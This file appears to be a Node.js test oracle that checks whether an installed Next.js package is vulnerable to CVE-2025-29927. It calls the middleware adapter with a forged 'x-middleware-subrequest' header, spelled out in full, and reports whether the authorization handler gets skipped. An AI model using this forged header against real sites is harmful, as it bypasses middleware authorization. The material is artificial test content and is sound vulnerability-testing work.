'use strict';
const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

const HEADER = 'x-middleware-subrequest';
const FORGED_SEGMENT = 'middleware';
const FORGED_VALUE = Array(5).fill(FORGED_SEGMENT).join(':');

if (typeof global.self === 'undefined') {
  global.self = global;
}
if (typeof global.EdgeRuntime === 'undefined') {
  global.EdgeRuntime = undefined;
}

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found in installed next package');
  }
  return mod.NextRequest;
}

function loadAdapterModule() {
  return require('next/dist/server/web/adapter');
}

// Build params so that 'page' matches what the vulnerable implementation
// uses internally as the depth-tracking identifier for middleware. In the
// vulnerable adapter, the page itself is normalized/used as 'middleware'
// when it is the middleware entry; we exercise the documented bypass shape
// directly by using '/middleware' as the page, matching the CVE's PoC
// (forged header value built from repeating the middleware identifier).
function buildParams(pagePath, url, headers, onInvoke) {
  return {
    page: pagePath,
    request: {
      url: url,
      method: 'GET',
      headers: headers,
      nextConfig: { basePath: '', i18n: null, trailingSlash: false }
    },
    IncrementalCache: undefined,
    handler: async function () {
      onInvoke();
      return new Response('ok', { status: 200 });
    }
  };
}

function main() {
  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  let adapterMod;
  try {
    adapterMod = loadAdapterModule();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve adapter module: ' + (e && e.message)
    });
    return;
  }

  if (typeof adapterMod.adapter !== 'function') {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: adapter() export not found on next/dist/server/web/adapter'
    });
    return;
  }

  // --- Benign operation: plain request with no forged header at all,
  // targeting the SAME page path ('/middleware') that will be used for the
  // malicious call, so the only variable that changes later is the header. ---
  let benignReq;
  try {
    benignReq = new NextRequest('https://example.com/middleware', {
      headers: { 'x-oracle-marker': marker }
    });
    const echoed = benignReq.headers.get('x-oracle-marker');
    if (echoed !== marker) {
      throw new Error('benign custom header did not round-trip: got ' + JSON.stringify(echoed));
    }
    const preexisting = benignReq.headers.get(HEADER);
    if (preexisting !== null) {
      throw new Error('unexpected pre-existing x-middleware-subrequest header on benign request: ' + preexisting);
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (request construction): ' + (e && e.message)
    });
    return;
  }

  let benignInvoked = false;
  let benignParams;
  try {
    benignParams = buildParams(
      '/middleware',
      'https://example.com/middleware',
      { 'x-oracle-marker': marker },
      function () { benignInvoked = true; }
    );
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (params build): ' + (e && e.message)
    });
    return;
  }

  let benignPromise;
  try {
    benignPromise = adapterMod.adapter(benignParams);
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (adapter threw synchronously): ' + (e && e.message)
    });
    return;
  }

  if (!benignPromise || typeof benignPromise.then !== 'function') {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: adapter() did not return a promise'
    });
    return;
  }

  benignPromise.then(
    function () { afterBenign(adapterMod, benignInvoked); },
    function (err) {
      finish({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_operation_failed (adapter rejected): ' + (err && err.message)
      });
    }
  );
}

function afterBenign(adapterMod, benignInvoked) {
  if (!benignInvoked) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: adapter() did not invoke the handler for an ordinary request with no forged header'
    });
    return;
  }

  // Benign operation succeeded -> operation_completed may become true from
  // this point forward, regardless of what happens next.

  let maliciousInvoked = false;
  let maliciousParams;
  try {
    maliciousParams = buildParams(
      '/middleware',
      'https://example.com/middleware',
      { [HEADER]: FORGED_VALUE },
      function () { maliciousInvoked = true; }
    );
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception (params build): ' + (e && e.message)
    });
    return;
  }

  let maliciousPromise;
  try {
    maliciousPromise = adapterMod.adapter(maliciousParams);
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception (adapter threw synchronously): ' + (e && e.message)
    });
    return;
  }

  if (!maliciousPromise || typeof maliciousPromise.then !== 'function') {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_returned_no_promise: adapter() behaved differently but did not demonstrate a header-driven skip of the handler'
    });
    return;
  }

  maliciousPromise.then(
    function (res) { finishWithResult(maliciousInvoked, null, res); },
    function (err) { finishWithResult(maliciousInvoked, err, null); }
  );
}

function finishWithResult(maliciousInvoked, err, res) {
  if (err) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_rejection: ' + (err && err.message)
    });
    return;
  }

  // In the vulnerable implementation, adapter() detects the forged
  // x-middleware-subrequest header whose colon-separated segments include
  // the internal page/middleware identifier up to MAX_RECURSION_DEPTH, and
  // short-circuits by returning a response without ever invoking the
  // handler — thereby bypassing any authorization logic the handler would
  // have enforced. In the fixed implementation this header is no longer
  // trusted for that purpose and the handler always runs.
  const skippedDueToForgedHeader = (maliciousInvoked === false);

  finish({
    operation_completed: true,
    exploit_succeeded: !!skippedDueToForgedHeader,
    evidence: skippedDueToForgedHeader
      ? ('Calling the installed next package\'s adapter() for page "/middleware" with only the forged header "' + HEADER + ': ' + FORGED_VALUE + '" caused the middleware handler to NOT be invoked at all (while an equivalent benign call to the same page without this header did invoke the handler), proving the package treats this attacker-forgeable header value as proof of an already-executed middleware pass and skips middleware-based authorization logic (CVE-2025-29927).')
      : ('Calling adapter() for the same page with the forged header still invoked the middleware handler normally (handler ran, response available: ' + (res ? 'yes' : 'no') + '), meaning the installed package no longer trusts the forged "' + HEADER + '" value to bypass middleware execution.')
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
